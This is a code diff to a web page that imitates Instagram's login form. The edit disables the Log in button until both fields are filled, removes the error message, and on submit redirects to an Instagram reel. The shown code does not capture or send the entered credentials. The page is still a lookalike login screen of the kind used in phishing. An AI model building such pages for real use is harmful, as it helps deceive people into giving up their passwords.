@@ -23,13 +23,8 @@
     <form id="loginForm">
       <input id="username" type="text" placeholder="Phone number, username, or email">
       <input id="password" type="password" placeholder="Password">
-      <button type="submit" class="login-btn">Log in</button>
+      <button type="submit" class="login-btn" disabled>Log in</button>
     </form>
-
-    <!-- رسالة الخطأ -->
-    <p id="error" class="error-msg">
-      Incorrect username or password
-    </p>
 
     <div class="or">
       <span></span>
@@ -52,20 +47,24 @@
 
 <!-- ✅ JavaScript -->
 <script>
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-  e.preventDefault();
+const username = document.getElementById("username");
+const password = document.getElementById("password");
+const button = document.querySelector(".login-btn");
+const form = document.getElementById("loginForm");
 
-  const user = document.getElementById("username").value.trim();
-  const pass = document.getElementById("password").value.trim();
-  const error = document.getElementById("error");
-
-  if (user === "" || pass === "") {
-    error.style.display = "block";
-    return;
+function checkInputs() {
+  if (username.value.trim() !== "" && password.value.trim() !== "") {
+    button.disabled = false;
+  } else {
+    button.disabled = true;
   }
+}
 
-  error.style.display = "none";
+username.addEventListener("input", checkInputs);
+password.addEventListener("input", checkInputs);
 
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
   const reelUrl = "https://www.instagram.com/reel/DSX5toMCFKG/";
   window.location.href = reelUrl;
 });
